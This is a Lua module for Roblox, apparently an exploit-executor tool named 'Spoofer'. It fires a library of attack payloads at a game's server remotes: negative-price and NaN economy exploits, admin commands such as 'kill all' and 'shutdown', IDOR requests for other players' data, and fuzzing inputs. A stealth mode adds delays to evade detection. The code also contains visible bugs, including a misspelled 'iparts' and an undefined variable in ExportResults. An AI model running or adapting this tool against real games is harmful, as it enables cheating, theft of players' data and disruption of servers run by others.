local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

local Spoofer = {}
Spoofer.__index = Spoofer

Spoofer.Config = {
    DelayBetweenTests = 0.3,
    MaxTestsPerRemote = 5,
    StopOnServerResponse = false,
    StealthMode = true,
    ValidateBeforeFire = false
}

Spoofer.Results = {}
Spoofer.TestHistory = {}

local PayloadLibrary = {
    Economy = {
        { Name = "Negative Price", Args = {nil, -99999}, Expect = "Success/ItemGiven" },
        { Name = "Zero Cost", Args = {nil, 0}, Expect = "Success/ItemGiven" },
        { Name = "Type Confusion String", Args = {nil, "FREE_HACK_6969"}, Expect = "Error/Success" },
        { Name = "Extreme Value", Args = {nil, 1e18}, Expect = "Overflow/Error" },
        { Name = "NaN Injection", Args = {nil, 0/0}, Expect = "Crash/Bypass" },
        { Name = "Negative Quantity", Args = {nil, nil, -1}, Expect = "NegativeItem/Error" }
    },
    Privilege = {
        { Name = "Mass Kill", Args = {"kill all"}, Expect = "Action/Success" },
        { Name = "Currency Injection", Args = {"give me 999999 money"}, Expect = "Balance Changed" },
        { Name = "Teleport All", Args = {"bring all"}, Expect = "Players Moved" },
        { Name = "Admin Bypass", Args = {"admin", "true"}, Expect = "Admin Granted" },
        { Name = "Shutdown Command", Args = {"shutdown"}, Expect = "Server Shutdown" }
    },
    DataExposure = {
        { Name = "IDOR UserID=1", Args = {1}, Expect = "OtherPlayerData" },
        { Name = "IDOR UserID=0", Args = {0}, Expect = "EdgeCase" },
        { Name = "IDOR String", Args = {"all"}, Expect = "AllPlayersData" },
        { Name = "IDOR Table", Args = {{UserId = 1, Username = "test"}}, Expect = "DataLeak" }
    },
    Fuzzing = {
        { Name = "Empty String", Args = {""}, Expect = "Error/Success" },
        { Name = "Very Long String", Args = {string.rep("A", 10000)}, Expect = "BufferOverflow/Error" },
        { Name = "Table Injection", Args = {{__mode = "k", __index = {x = 1}}}, Expect = "MemoryCorruption" },
        { Name = "Function Injection", Args = {function() end}, Expect = "Execution/Error" },
        { Name = "Instance Injection", Args = {Instance.new("Part")}, Expect = "InstanceAccepted/Error" },
        { Name = "CFrame Injection", Args = {CFrame.new(1e10, 1e10, 1e10)}, Expect = "PositionOverflow" },
        { Name = "Vector3 Exploit", Args = {Vector3.new(1e10, 1e10, 1e10)}, Expect = "OutOfBounds" },
        { Name = "UDim2 Injection", Args = {UDim2.new(0, 99999, 0, 99999)}, Expect = "UIOverflow" }
    }
}

local function FormatArgs(args)
    local str = {}
    for i, a in ipairs(args or {}) do
        table.insert(str, typeof(a) == "string" and ("\"" .. a:sub(1, 30) .. "\"") or tostring(a))
    end
    return #str > 0 and table.concat(str, ", ") or "(no args)"
end

local function GetRemoteByPath(path)
    local parts = path:split("/")
    local current = ReplicatedStorage
    for _, part in iparts(parts) do
        current = current:FindFirstChild(part)
        if not current then return nil end
    end
    return current
end

local function ResolveRemote(name, path)
    if path and path ~= "" then
        local byPath = GetRemoteByPath(path)
        if byPath then return byPath end
    end
    if name then
        return ReplicatedStorage:FindFirstChild(name, true)
    end
    return nil
end

function Spoofer:Init(logger)
    self.Logger = logger or {Warn = warn, Info = print, Error = error}
    self.Results = {}
    self.TestHistory = {}
    return self
end

function Spoofer:RunTests(findingsTable)
    if not findingsTable then
        self.Logger:Warn("[Spoofer] No findings provided. Use Profiler output.")
        return
    end

    self.Logger:Info("[Spoofer] Starting Intelligent Payload Injection...")
    self.Results = {}

    if self.Config.StealthMode then
        self.Logger:Info("[Spoofer] Stealth mode enabled — adding delays to avoid detection.")
    end

    local testOrder = {
        { Key = "PrivilegeEscalation", Label = "Privilege Escalation", Library = "Privilege" },
        { Key = "BusinessLogic", Label = "Business Logic", Library = "Economy" },
        { Key = "DataExposure", Label = "Data Exposure / IDOR", Library = "DataExposure" },
        { Key = "HiddenRemotes", Label = "Hidden Remotes", Library = "Fuzzing" },
        { Key = "UnusualBehaviors", Label = "Map/Unusual Remotes", Library = "Fuzzing" }
    }

    for _, group in ipairs(testOrder) do
        local findings = findingsTable[group.Key]
        if findings and #findings > 0 then
            self.Logger:Warn(string.format("[Spoofer] Testing: %s (%d targets)", group.Label, #findings))

            for _, finding in ipairs(findings) do
                local remote = ResolveRemote(finding.Remote, finding.Path)
                if remote then
                    self:TestRemote(remote, group.Library, finding)
                    task.wait(self.Config.DelayBetweenTests * (self.Config.StealthMode and 2 or 1))
                else
                    self.Logger:Warn(string.format("[Spoofer] Could not resolve remote: %s", finding.Remote))
                end

                if #self.Results >= 20 then
                    self.Logger:Info("[Spoofer] Reached result limit. Stopping tests.")
                    break
                end
            end
        end
    end

    self.Logger:Info(string.format("[Spoofer] Testing complete. %d results.", #self.Results))
    return self.Results
end

function Spoofer:TestRemote(remoteObj, category, findingInfo)
    local payloads = PayloadLibrary[category]
    if not payloads then
        payloads = PayloadLibrary.Fuzzing
    end

    self.Logger:Info(string.format("  -> Testing: %s (%s)", remoteObj.Name, category))

    for i, payload in ipairs(payloads) do
        if i > self.Config.MaxTestsPerRemote then break end

        task.wait(self.Config.DelayBetweenTests)

        local realArgs = {}
        for _, arg in ipairs(payload.Args) do
            if arg == nil and #payload.Args == self:GetExpectedArgCount(remoteObj) then
                table.insert(realArgs, "DEFAULT")
            else
                table.insert(realArgs, (arg == nil and "FREE_HACK" or arg))
            end
        end

        local success, response = pcall(function()
            if remoteObj:IsA("RemoteFunction") then
                return remoteObj:InvokeServer(unpack(realArgs))
            else
                remoteObj:FireServer(unpack(realArgs))
                return "[Fired — No Return]"
            end
        end)

        local isVulnerable = false
        local responseStr = tostring(response)
        local vulnerableSignals = {"success", "true", "granted", "accepted", "approved", "complete", "1", "valid"}

        if success then
            if responseStr ~= "[Fired — No Return]" then
                for _, signal in ipairs(vulnerableSignals) do
                    if responseStr:lower():find(signal) then
                        isVulnerable = true
                        break
                    end
                end
            end
            if category == "DataExposure" and type(response) == "table" then
                isVulnerable = true
            end
            if category == "Economy" and type(response) == "number" then
                isVulnerable = true
            end
        end

        local logMsg = string.format("     [%s] %s | Args: %s | Response: %s",
            isVulnerable and "VULN!" or "SAFE",
            payload.Name,
            FormatArgs(realArgs),
            responseStr:sub(1, 60))

        if isVulnerable then
            self.Logger:Warn(logMsg)
        else
            self.Logger:Info(logMsg)
        end

        table.insert(self.Results, {
            Remote = remoteObj.Name,
            Payload = payload.Name,
            Category = category,
            Args = realArgs,
            Response = response,
            Vulnerable = isVulnerable
        })

        if isVulnerable and self.Config.StopOnServerResponse then break end
    end
end

function Spoofer:TestSpecificRemote(remote, args)
    if not remote then
        self.Logger:Error("[Spoofer] No remote provided.")
        return nil
    end

    self.Logger:Info(string.format("[Spoofer] Testing specific remote: %s", remote.Name))

    local success, response = pcall(function()
        if remote:IsA("RemoteFunction") then
            return remote:InvokeServer(unpack(args or {}))
        else
            remote:FireServer(unpack(args or {}))
            return "[Fired — No Return]"
        end
    end)

    local result = {
        Remote = remote.Name,
        Path = remote:GetFullName(),
        Args = args,
        Success = success,
        Response = response,
        Timestamp = tick()
    }

    table.insert(self.TestHistory, result)

    if success then
        self.Logger:Info(string.format("  -> Success. Response: %s", tostring(response):sub(1, 100)))
    else
        self.Logger:Warn(string.format("  -> Error: %s", tostring(response)))
    end

    return result
end

function Spoofer:GetExpectedArgCount(remoteObj)
    local ok, conns = pcall(function() return getconnections(remoteObj) end)
    if ok and conns and #conns > 0 then
        for _, conn in ipairs(conns) do
            if conn.Function then
                local info = debug.getinfo(conn.Function)
                if info and info.nparams then
                    return info.nparams
                end
            end
        end
    end
    return -1
end

function Spoofer:PrintResults()
    if #self.Results == 0 then
        self.Logger:Info("[Spoofer] No test results to show.")
        return
    end

    print("\n" .. string.rep("=", 60))
    print("           SPOOFER TEST RESULTS")
    print(string.rep("=", 60))
    print(string.format("\nTotal Tests: %d", #self.Results))

    local vulnerable = 0
    for _, r in ipairs(self.Results) do
        if r.Vulnerable then vulnerable = vulnerable + 1 end
    end
    print(string.format("Potential Vulnerabilities: %d", vulnerable))

    if vulnerable > 0 then
        print("\n  CONFIRMED VULNERABLE:")
        for _, r in ipairs(self.Results) do
            if r.Vulnerable then
                print(string.format("    ! %s -> %s (%s)", r.Remote, r.Payload, r.Category))
                print(string.format("      Args: %s", FormatArgs(r.Args)))
            end
        end
    end

    print("\n" .. string.rep("=", 60) .. "\n")
end

function Spoofer:ExportResults()
    return HttpService:JSONEncode({
        Timestamp = os.time(),
        TotalTests = #self.Results,
        Vulnerabilities = vulnerable,
        Results = self.Results
    })
end

return Spoofer